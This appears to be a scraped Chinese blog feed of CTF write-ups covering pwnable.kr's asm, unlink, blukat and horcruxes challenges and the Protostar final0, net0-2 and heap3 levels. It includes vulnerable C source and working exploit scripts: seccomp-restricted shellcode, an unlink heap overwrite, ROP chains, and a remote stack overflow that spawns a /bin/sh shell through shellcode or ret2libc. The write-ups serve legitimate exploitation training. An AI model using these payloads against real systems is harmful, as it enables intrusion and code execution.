12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 这道题让我们输入shellcode，读取当前目录下的flag文件。 我们输入的shellcode作为整个shellcode的一部分拼接到stub后面，所以看看stub都写了什么。 帮我们把寄存器都清零了，对我们将要写的shellcode也没什么影响，不用管 sandbox函数中的seccomp之前遇到过，是让进程进入安全模式，通过seccomp_rule_add限定了只能进行open,read,write,exit,exit_group这几个系统调用。 所以思路就是用open打开flag文件，read读取内容，write输出到屏幕。 这次flag文件名那么长，肯定不能像上次一样手写汇编代码了，所以用到了pwnlib下的shellcraft子模块。(其实一开始真的是打算手写汇编代码的，以为open的文件名参数可以用通配符来指代，后面发现不行。。) 脚本如下： 1234567891011121314from pwn import *s = ssh(host='pwnable.kr', user='asm', port=2222, password='guest')c = s.connect_remote('127.0.0.1', 9026)context(arch='amd64', os='linux')shellcode = ''shellcode += shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)print (c.recv())c.sendline(asm(shellcode))print(c.recvline()) 拿到flag12345678910111213141516[+] Connecting to pwnable.kr on port 2222: Done[*] asm@pwnable.kr: Distro Ubuntu 16.04 OS: linux Arch: amd64 Version: 4.10.0 ASLR: Enabled[+] Connecting to 127.0.0.1:9026 via SSH to pwnable.kr: DoneWelcome to shellcoding practice challenge.In this challenge, you can run your x64 shellcode under SECCOMP sandbox.Try to make shellcode that spits flag using open()/read()/write() systemcalls only.If this does not challenge you. you should play &apos;asg&apos; challenge :)give me your x64 shellcode:Mak1ng_shelLcodE_i5_veRy_eaSy[*] Closed remote connection to 127.0.0.1:9026 via SSH connection to pwnable.kr 参考： blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ unlink题目：ssh -p2222 unlink@pwnable.kr (pw:guest) 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 题目直接用一个unlink函数把unlink的漏洞暴露出来了，没有让我们用free去触发unlink，所以也不用构造fake chunk，比上次的unlink题目简单了许多。 main中申请了三个chunk，通过结构体易知每个chunk的大小为24(0x18)字节(chunk头8字节，结构体成员16字节) 重新梳理一遍unlink的原理吧，感觉上次说的不是很清楚。 unlink原理在gets前面下个断点，查看堆布局。 容易看出这是双向链表的结构(注释也说明了)，接下来的unlink(B)就将chunkB从这个链表结构中脱离出来。 仔细分析一下unlink： 12BK=P-&gt;bk;FD=P-&gt;fd; 这两步执行完后，BK和FD就分别指向了chunkA和chunkC 12FD-&gt;bk=BK;BK-&gt;fd=FD; 这两步交叉赋值的操作就是将chunkB从链表结构中脱离出来的操作，也是unlink的漏洞所在。 漏洞就在于：如果我们能控制chunkB中fd和bk的值，就可以利用这两步交叉赋值的操作实现任意地址写。 具体到这道题来讲：结构体指针指向的是首个数据成员的地址，并且是通过改变偏移量来寻址的，所以FD-&gt;bk就相当于FD+0x4，BK-&gt;fd就相当于BK。如果将fd覆盖为某个函数的got表项，bk覆盖为shellcode的地址，在调用那个函数的时候就相当于转到shellcode执行代码了。 但是这道题最后一个函数就是unlink,后面没有函数给我们用了，只能找其他办法。 刚开始想的是直接将程序的返回地址覆盖为shell()的地址，但是由于unlink是交叉赋值的，就会导致shell()的代码被破坏，所以这个办法不行。 注意到unlink后面还有一小段代码用到了ecx，可以在chunk_A中某个位置放置shell()的地址，再将地址为ebp-0x4内存覆盖为heap_A的地址+某个偏移量，利用mov ecx,DWORD PTR [ebp-0x4]，以ecx为跳板，将shell()的地址覆盖到栈顶，最后ret完成跳转。剩下的就是计算偏移量的事情了。 题目给我们A的stack_addr和heap_addr分别是0xbffff644和0x804b410 shell的地址为0x80484eb 对比一下给的栈地址和ebp的值，得到ebp-0x4 == stack_addr + 0x10 我们将shell()地址放在chunkA的buf开头，所以heap_addr + 0x8是shell()的地址。 所以由式子ecx - 0x4 = shell地址 = heap_addr + 0x8 得ecx = heap_addr + 0xc 然后脚本就很容易写出来了 12345678910111213141516from pwn import *s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')p = s.process('unlink')print (p.recvuntil('here is stack address leak: '))stack_addr = int(p.recvline().strip(), 16)print (p.recvuntil('here is heap address leak: '))heap_addr = int(p.recvline().strip(), 16)#print ('stack address = '+str(hex(stack_addr)))#print ('heap address = '+str(hex(heap_addr)))shellcode = p32(0x80484eb) + 'a'*12 + p32(heap_addr+0xc) + p32(stack_addr+0x10)p.sendline(shellcode)p.interactive() 拿到flag conditional_write_what_where_from_unl1nk_explo1t blukat题目：ssh blukat@pwnable.kr -p2222 (pw: guest) 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";void calc_flag(char* s)&#123; int i; for(i=0; i&lt;strlen(s); i++)&#123; flag[i] = s[i] ^ key[i]; &#125; printf("%s\n", flag);&#125;int main()&#123; FILE* fp = fopen("/home/blukat/password", "r"); fgets(password, 100, fp); char buf[100]; printf("guess the password!\n"); fgets(buf, 128, stdin); if(!strcmp(password, buf))&#123; printf("congrats! here is your flag: "); calc_flag(password); &#125; else&#123; printf("wrong guess!\n"); exit(0); &#125; return 0;&#125; 题目让我们猜到password文件内容就直接拿到flag了。想了半天该怎么溢出，一直以为切入点在strcmp，结果。。。这题考的是细心。。 本来做其他题的时候一样，scp复制文件夹到本地，结果发现password也一起被复制过来了。这就说明我们有直接读取password的权限。然后我试着读了一下： 这根本读不了啊！ 我不服，直接打开刚刚下载到本地的password文件 突然意识到了什么(✧≖‿ゝ≖) 文件内容就是cat: password: Permission denied ！ 再确认一下，果然我们已经属于blukat_pwn用户组了 直接拿到flag：Pl3as_DonT_Miss_youR_GrouP_Perm!! horcruxes题目：ssh horcruxes@pwnable.kr -p2222 (pw:guest) 开了NX，可能没办法用shellcode了。 这次没给源码，那就先放进ida里面看看。(F5大法好) 题目让你去找伏地魔放在7个地方的魂器，并且破坏它们，得到经验值。 说人话：题中用/dev/urandom做种子生成了7个随机数。分别放在了7个变量里面，并且将和赋给sum，在ropme函数里面要让你输入数字猜这些随机数是多少，猜中了就给你说是多少(我要是知道了还要你说？)，最后把7个变量的值加起来，等于sum就拿flag。 这道题切入点很好找，在ropme中读取7个变量和的时候用的是gets，所以考虑从这里溢出。 本来一开始想的是直接覆盖返回值到if里面，把flag读出来就完事。结果ropme函数整个地址都是以0x080a开头的，0xa会被gets当作输入结束的信号(回车)，并且把0xa替换成0x00，最终导致没办法直接返回到ropme函数中去。 这条路不同就换条路呗，大不了把所有变量值找出来。 计算从gets到ret的填充量为120字节，再找到A的地址为0x809fe4b，试试能不能返回到A。 1234import structpayload = 'a'*120 + struct.pack("I", 0x809fe4b)print payload 确实返回到了A并且打印出了变量a的值。 并且在A恢复栈帧后，下一个返回值在栈中的位置就是上个位置+4，这样就可以依次将每个变量的值都打印出来，计算和。 然后考虑怎么再次进入ropme函数来提交刚刚算出的和。 main函数中call了ropme，所以返回到这里就行了。 123456789101112131415161718192021222324252627from pwn import *s = ssh(host='pwnable.kr', user='horcruxes', port=2222, password='guest')c = s.connect_remote('127.0.0.1',9032)payload = 'a'*120 + p32(0x809fe4b) + p32(0x809fe6a) + \ p32(0x809fe89) + p32(0x809fea8) + \ p32(0x809fec7) + p32(0x809fee6) + \ p32(0x809ff05) + p32(0x809fffc)print (c.recvuntil('Select Menu:'))c.sendline('1')print (c.recvuntil('earned? : '))c.sendline(payload)exp = 0for i in range(7): c.recvuntil('(EXP +') exp = exp + int(c.recvline().replace(')',"").strip()) print (exp)print (c.recvuntil('Select Menu:'))c.sendline('1')print (c.recvuntil('earned? : '))c.sendline(str(exp))print (c.recv()) flag：Magic_spell_1s_4vad4_K3daVr4!]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x1D-final0]]></title>
    <url>%2F2018%2F11%2F09%2FLiveoverflow-0x1D-final0%2F</url>
    <content type="text"><![CDATA[终于到了final部分(°ཀ°) final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。 视频链接：http://liveoverflow.com/binary_hacking/ Protostar Final0AboutThis level combines a stack overflow and network programming for a remote overflow. Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode. Core files will be in /tmp This level is at /opt/protostar/bin/final01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include "../common/common.c"#define NAME "final0"#define UID 0#define GID 0#define PORT 2995/* * Read the username in from the network */char *get_username()&#123; char buffer[512]; char *q; int i; memset(buffer, 0, sizeof(buffer)); gets(buffer); /* Strip off trailing new line characters */ q = strchr(buffer, '\n'); if(q) *q = 0; q = strchr(buffer, '\r'); if(q) *q = 0; /* Convert to lower case */ for(i = 0; i &lt; strlen(buffer); i++) &#123; buffer[i] = toupper(buffer[i]); &#125; /* Duplicate the string and return it */ return strdup(buffer);&#125;int main(int argc, char **argv, char **envp)&#123; int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); username = get_username(); printf("No such user %s\n", username);&#125; 分析主函数和前面net一样，直接看get_username。定义了一个512字节大小的字符串数组，接着将其置零。随后调用了gets将输入放在buffer中。很明显要利用gets将字符串溢出到return，覆盖其返回指针(也就是eip)到我们的shellcode处。 但是注意到中间还有两段代码，一段是用strchr查找字符串中的换行符(\n)和回车符(\r)，如果字符串中出现了，就将其首次出现的位置的值置零。 The strchr() function returns a pointer to the first occurrence of the character c in the string s. 第二段for循环是通过toupper()将整个字符串的字母变为大写。所以，shellcode中所有在小写字母(0x61~0x7a)范围内的数据都会被toupper转化为大写字母(0x41~0x5a),除非确保shellcode中不出现小写字母范围内的数据，否则shellcode就会被toupper破坏掉。 有什么办法可以绕过toupper呢？ 首先保证shellcode中没有小写字母范围是数据是不太现实的，不考虑。所以就只有让toupper在shellcode之前停止转化。它所转化的长度是从strlen得到的，而strlen计算字符串长度时是将空字符(\x00)作为一个字符串的结尾。 The strlen() function calculates the length of the string s, not including the terminating ‘\0’ character. 所以我们可以在shellcode之前放置一个空字符来阻断strlen的读取，这样就能保证shellcode不会被转化。(我一开始以为gets读取数据时会在空字符处停下，就一直不知道该怎么样才能把空字符输入进去。。其实gets只会在换行或者EOF时停止。论man page的重要性~) gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF,which it replaces with ‘\0’. 先测试一下，字符串转化为了大写，没问题。 写一小段脚本测试一下可见并没有传回任何字符串，所以我们应该是通过溢出把返回地址覆盖掉了，没有返回到main，自然就不会传回字符串。但是现在怎么debug这个程序呢？直接gdb ./final0肯定不行，因为接收的数据是从远程传入的，虽然能看到反汇编的代码，但是我们需要动态调试才能更清楚知道具体发生了什么。 回去看一眼题目：Core files will be in /tmp。这个core file是什么东西？ man core看一眼 NAME core - core dump fileDESCRIPTION The default action of certain signals is to cause a process to terminate and produce a core dump file, a disk file containing an image of the process’s memory at the time of termination. This image can be used in a debugger (e.g., gdb(1)) to inspect the state of the program at the time that it terminated. A list of the signals which cause a process to dump core can be found in signal(7). 说白了core dump file(核心转储文件)就是在程序因为接收到系统的某些信号或者崩溃时而强制中断时所产生的文件，而这个文件包含了程序在中断时一些内存的信息，并且这个文件可以被gdb调试。 上面还提到了signal可以在signal(7)查看，man 7 signal看一眼。 当中有一部分的signal我们已经很熟悉了，像什么SIGSEGV、SIGILL经常在栈溢出的时候遇见。这些信号中大部分都能导致core dump file的产生。 解题 由于刚才的溢出，/tmp里确实生成了一个文件(第一个)，不说废话直接进gdb。 用gdb调试core dump file的格式是 gdb 原始程序路径 核心转储文件路径 调试之前记得要有root权限，密码godmode。 可以看到一进gdb就提示Segmentation fault，和猜想的一样，确实覆盖了返回地址。 然后就好办了，计算一下偏移量，规划一下payload。红框位置是返回地址，也就是FFFF，覆盖为随便往后一点的地址，接下来依次放空字符、nop指令块(为了提高exploit的容错性)，最后是shellcode。 最后exploit如下：1234567891011121314import structimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(("127.0.0.1", 2995))padding = "A"*511 + "\x00" + "AAAABBBBCCCCDDDDEEEE"ret = struct.pack("I", 0xbffffc5c+30)nop = "\x90"*100payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"s.send(padding + ret + nop + payload + "\n")s.send("id\n")print s.recv(1024)s.send("uname -a\n")print s.recv(1024) 注意send的最后加一个换行符是为了确保gets能正确的结束读取。 使用的shellcode是上次做0x0E用到的。传送门：https://muirelle.com/2018/10/03/Liveoverflow-0x0E-Shellcode/ 拿到shell 再次分析因为手贱出于好奇心，我想确认一下空字符是否真的起了作用，于是就把脚本里面的空字符删了(前面的A相应的多加一个，变成512个)再运行一次。结果让我感觉我刚刚做的题都白做了，删了空字符一样能拿到shell，震惊了。 经过大佬的指点，我检查了一遍shellcode，确保不是真的运气好到爆棚遇到第一种情况了，shellcode中确实存在在小写字母范围内的数据。所以只能是第二种情况，shellcode前面还有非人为添加的空字符。 进gdb看个明白 这里需要gdb调试正在运行的程序，所以加上参数-p。用pidof 程序名命令获取正在运行的程序的pid。同样需要root权限才能调试。 进入gdb后可以看到accept已经在运行中了，意味着这个程序正在等待客户端的连接。因为数据处理都是在子程序完成的，所以还要用set follow-fork-mode child命令让gdb跟踪子程序，不然没办法调试外面传入的数据。 在gets和for循环外面找个地方下断点。然后c命令让程序跑起来。 新开一个终端运行不带空字符的脚本。(为了直观，我把A改成了a) 断点gets：padding(红框)、返回地址(蓝框)、nop块(黄框)、shellcode(橙框)依次排列，没问题，继续。 for循环外的断点：先注意到一大片的a已经被替换成A了，但是shellcode安然无恙。白框部分被自动替换成0x200。很明显，就是这些\x00让strlen认为已经读到了字符串的末尾，所以toupper没有继续往后转换。问题来了，这个0x200是谁放上去的。。。？ 0x200，刚好等于512，难道。。。是strlen把0x200放在这的？除了strlen题目中没有其他函数可以计算出0x200这个值，但是这并不符合逻辑，strlen是先计算长度再放置数据的，不可能一开始就在某一个地方占个0，计算完前面的长度在把数据放到上面，这样太蠢了。所以在strlen调用前一定有其他函数做过手脚。 不得不开始单步调试(눈‸눈) 反汇编一下源码，红框和蓝框部分分别是源码中两次调用strchr并置零的部分，从0xa(换行)，0xd(回车)可以看出。而就是橙框和绿框将上一张图的白框位置先后置零了。所以这个过程应该是：strchr将返回值传给ax，然后ax的值被放在ebp-0x10，正好就是白框的位置。而白框正好位于程序一开始申请的512字节大小的内存后面，所以if语句认为白框的位置的内存是空闲的，就将ax的值放进去，再和0作比较(源码中的if语句)，如果相等的话说明没有找到指定的字符，不相等的话说明ax就是找到的那个字符的地址，则je语句不执行，接着两行代码将0放在ax指向的位置。 红框和蓝框做的事情相同，恰好shellcode中没有出现\x0a或者\x0d，所以有8字节的空字符。 现在知道空字符是怎么来的了，那0x200呢？接着调试。 并不是一下子就到了0x200，而是一字节一字节增长的(是从0开始的，前面没截到图(´-ι_-｀))，所以可以断定这是变量 i 而不是strlen放上去的。 而strlen检测到的长度直接放在ax中，马上就和bx进行比较了，所以再次确定不关strlen的事。 最后可以确定下来，if语句需要四字节的内存存放strchr的返回值用于和0比较，不管strchr有没有找到指定的字符，这四个字节都会被置零(一种是被返回值置零，一种是被if置零),较后运行的strlen就被这几个0给挡住了，后面的数据不管怎样也不会变成大写了。。。 strlen：strchr，这锅你背。 strchr：不管我事啊，是if的锅啊。 toupper：闭嘴，你们几个都是坑b。 到头来还是我被坑了(╯’-‘)╯ ┻━━━┻ 再次解题用返回到栈里执行shellcode的方法既不可靠也不高大上，所以换一种方法解题。 ret2libc。这个办法之前做stack部分的时候也用到过，比单纯返回栈执行shellcode可靠。 既然要ret2libc就要先找到有哪些已经在内存中的libc的函数可以被我们利用。 info functions @plt查看可用的函数(先su拿到root) 发现有execve，这个函数可以帮我们执行/bin/sh，就用它了。记下地址0x08048c0c execve() executes the program pointed to by filename. filename must be either a binary executable 写一小段程序看看用execve运行/bin/sh时栈内是怎么布局的，然后payload就仿照这个布局。1234void main()&#123; execve("/bin/sh", 0, 0);&#125; 第一个数据(红框)是返回值，也就是返回main的地址，构造payload时不用管它，随便填一个数据就行了，因为我们不需要它返回。第二个数据(蓝框)就是/bin/sh的地址，所以要找到/bin/sh的地址(libc的起始地址 + /bin/sh的偏移地址) 1234567891011121314import structimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(("127.0.0.1", 2995))padding = "A"*511 + "\x00" + "AAAABBBBCCCCDDDDEEEE"execve = struct.pack("I", 0x08048c0c)bsh = struct.pack("I", 0xb7e97000 + 1176511)arg = "AAAA" + bsh + "\x00"*8s.send(padding + execve + arg + "\n")s.send("id\n")print s.recv(1024)s.send("uname -a\n")print s.recv(1024) 成功。 可是这样还不够，还要再高大上一点(✧≖‿ゝ≖) 使用python的telnetlib模块对服务器进行连接实现远程操控。 修改后的脚本123456789101112131415161718import structimport socketimport telnetlibs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(("127.0.0.1", 2995))padding = "A"*511 + "\x00" + "AAAABBBBCCCCDDDDEEEE"execve = struct.pack("I", 0x08048c0c)bsh = struct.pack("I", 0xb7e97000 + 1176511)arg = "AAAA" + bsh + "\x00"*8s.send(padding + execve + arg + "\n")s.send("id\n")s.send("uname -a\n")print s.recv(1024)t = telnetlib.Telnet()t.sock = st.interact() 如果在同一个局域网内并且知道这台机器的ip的话(ip addr)，也可以在外面用同一个脚本进行连接，改一下ip就行了 nice~]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x19-net0~2]]></title>
    <url>%2F2018%2F11%2F02%2FLiveoverflow-0x19-net0-2%2F</url>
    <content type="text"><![CDATA[把heap部分啃完之后终于来到net部分，与网络相关。需要多花时间理解。 视频链接：http://liveoverflow.com/binary_hacking/ Protostar Net0AboutThis level takes a look at converting strings to little endian integers. This level is at /opt/protostar/bin/net0 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include "../common/common.c"#define NAME "net0"#define UID 999#define GID 999#define PORT 2999void run()&#123; unsigned int i; unsigned int wanted; wanted = random(); printf("Please send '%d' as a little endian 32bit int\n", wanted); if(fread(&amp;i, sizeof(i), 1, stdin) == NULL) &#123; errx(1, ":(\n"); &#125; if(i == wanted) &#123; printf("Thank you sir/madam\n"); &#125; else &#123; printf("I'm sorry, you sent %d instead\n", i); &#125;&#125;int main(int argc, char **argv, char **envp)&#123; int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don't do this :&gt; */ srandom(time(NULL)); run();&#125; 铺垫先看源码，一开始分别定义了name，uid，gid和port。接着再看main函数，main函数中调用的前三个函数都是在程序一开始声明的头文件中，看作者给的注释可以大概了解这些函数的作用。 首先，第一个函数的作用是将这个程序(就是net0)变为一个后台进程运行(又称daemon(守护进程))) 所以可以看到无论怎么运行net0都没有反应 ps aux | grep net0查看一下正在运行的程序，net0确实是在后台运行着的。 用strace跟踪一下net0(需要先用su获得root权限，然后kill掉刚刚这个net0进程，root密码是godmode)。可以看到在结尾处调用了clone函数，clone的作用简单说就是生下一个新的进程，新的进程就是这个进程的一个复制，并且返回值是这个新进程的pid。紧接着就调用了exit，将父进程终止了，留下一个刚刚创建的进程，又称为Orphan process(孤儿进程)。而像这种故意制造的孤儿进程又被称为守护进程，就是刚刚提到的那个。 既然有子进程就看看子进程到底干了什么，命令strace带上参数-f可以跟踪一个程序的子进程。如图，在子进程(红框)中，打开了文件/dev/null，任何写进它的数据都会被丢弃，所以被称为“黑洞”，图中将0(stdin标准输入)，1(stdout标准输出),2(stderr标准错误输出)都指向了这个黑洞。接下来这个子程序调用了socket，这意味着你将建立一个网络连接，通过socket中提供的各种参数你可以选择需要连接的类型。然后程序调用了bind，参数之一为端口号2999，这意味着如果操作系统接收到了一个想要与这个程序建立连接的数据包，它会将这个包连同里面的数据发送给这个程序。但是看到图中调用bind失败了，提示2999端口已经被占用了，嗯，因为之前我们已经运行了net0还没有kill掉，所以端口自然就被前一个net0占用了。把它kill掉，带上-f选项再运行一次。 重新运行之后可以看到bind成功绑定了2999端口，接着调用了listen和accept，listen用于监听我们刚才打开的端口，accept等待用于连接的数据包。具体过程如下图 图源：https://realpython.com/python-sockets/ 接着用命令netstat -plant | grep net0查看一下，端口2999确实处于被net0监听的状态。 再开一个终端，nc 1270.0.1 2999命令用于连接到刚才监听端口，可以把左边的终端看作服务器，右边的终端看作客户端。现在服务器正在执行read用于等待客户端发送的数据。 随便发送一些数据，这时候服务器就要用到题目中的run函数来判断我们的数据是否满足要求，很明显不满足，所以返回显示我们输入不正确的字符串，并且断开连接，重新等待客户端与服务器建立连接。 题解有了前面大致的了解就可以开始做题了。题目要求我们把字符串转换为小端的整数。 题目是简单的，两步就完了。但还是有些地方要注意。 由于服务器发送的数据是随机的，所以我们没办法用echo和管道将数据发送给服务器，但是有一个小技巧，老朋友`cat。通过将cat嵌套进echo中，可以将输入的数据通过cat反射出来再通过echo发送给服务器，再加上-e参数，解释特殊字符，就行了。 如果不好理解的话就写个脚本。我们作为客户端，使用的函数和服务器端就稍有不同，我们设置好ip和端口(port)参数之后用connect函数主动和服务器进行连接，连接成功后用send发送数据，再用recv接收服务器传回的数据，以此来和服务器进行交互。 上图中用正则表达式将服务器返回的字符串中我们需要的那个数字取出，这时数字还是字符串类型，所以转换为int类型之后再用struct.pack打包发送给服务器就行了。 Protostar Net1AboutThis level tests the ability to convert binary integers into ascii representation. This level is at /opt/protostar/bin/net1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include "../common/common.c"#define NAME "net1"#define UID 998#define GID 998#define PORT 2998void run()&#123; char buf[12]; char fub[12]; char *q; unsigned int wanted; wanted = random(); sprintf(fub, "%d", wanted); if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) &#123; errx(1, ":(\n"); &#125; if(fgets(buf, sizeof(buf)-1, stdin) == NULL) &#123; errx(1, ":(\n"); &#125; q = strchr(buf, '\r'); if(q) *q = 0; q = strchr(buf, '\n'); if(q) *q = 0; if(strcmp(fub, buf) == 0) &#123; printf("you correctly sent the data\n"); &#125; else &#123; printf("you didn't send the data properly\n"); &#125;&#125;int main(int argc, char **argv, char **envp)&#123; int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don't do this :&gt; */ srandom(time(NULL)); run();&#125; 题解直接看函数run，和net0一样，生成了一个随机数，但是这次没有将这个数格式化之后再发给我们，而是直接将原本数据发过来，所以我们就只能看到一堆乱码。 显然这次想用net0的第一个方法就不行了，那就写脚本呗。 直接上脚本，接收到数据再加点工发回去就行了。注意一点服务器发来的数据需要解包再转换成字符串再发回去才行，因为run中是将两个字符串进行对比的。 Protostar Net2AboutThis code tests the ablity to add up 4 unsigned 32-bit integers. Hint:Keep in mind that it warps This level is at /opt/protostar/bin/net2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include "../common/common.c"#define NAME "net2"#define UID 997#define GID 997#define PORT 2997void run()&#123; unsigned int quad[4]; int i; unsigned int result, wanted; result = 0; for(i = 0; i &lt; 4; i++) &#123; quad[i] = random(); result += quad[i]; if(write(0, &amp;(quad[i]), sizeof(result)) != sizeof(result)) &#123; errx(1, ":(\n"); &#125; &#125; if(read(0, &amp;wanted, sizeof(result)) != sizeof(result)) &#123; errx(1, ":&lt;\n"); &#125; if(result == wanted) &#123; printf("you added them correctly\n"); &#125; else &#123; printf("sorry, try again. invalid\n"); &#125;&#125;int main(int argc, char **argv, char **envp)&#123; int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don't do this :&gt; */ srandom(time(NULL)); run();&#125; 题解同样和net1稍有不同，题目将4个随机数依次发给我们，最后需要我们将这四个数的和发过去。 既然它是分次发送的数据，那我们就分次接收，最后将数据加起来再发回去就行了。 红框部分特别注意一下，为什么不直接将求出的和x打包，而是要同0xffffffff与运算之后再打包呢？ 因为考虑到四个随机数相加很有可能会超过4byte，为了确保不会溢出，将和同0xffffffff与运算之后溢出位的1就置零了。 总结net部分的题目说复杂也复杂，说简单也简单。复杂就复杂在对网络相关的socket部分的理解，虽然理解不是很深刻也能做题，但总觉得不爽。抛开网络这部分来说，题目本身是比较简单的。涉及到的面也比较窄(指protostar里面的题目)。]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x18-heap3]]></title>
    <url>%2F2018%2F10%2F24%2FLiveoverflow-0x18-heap3%2F</url>
    <content type="text"><![CDATA[unlink漏洞的利用。相比于之前的题目，综合性提高了不少。 视频链接：http://liveoverflow.com/binary_hacking/ Protostar Heap3AboutThis level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution. This level is at /opt/protostar/bin/heap3 1234567891011121314151617181920212223242526272829#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;void winner()&#123; printf("that wasn't too bad now, was it? @ %d\n", time(NULL));&#125;int main(int argc, char **argv)&#123; char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf("dynamite failed?\n");&#125; malloc_chunk首先需要大致了解malloc的相关知识，从网上找各种资料和图片都有细微的差异，虽然有些枯燥，但还是看源码实在一些。 这是malloc_chunk在malloc.c中的定义： 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only 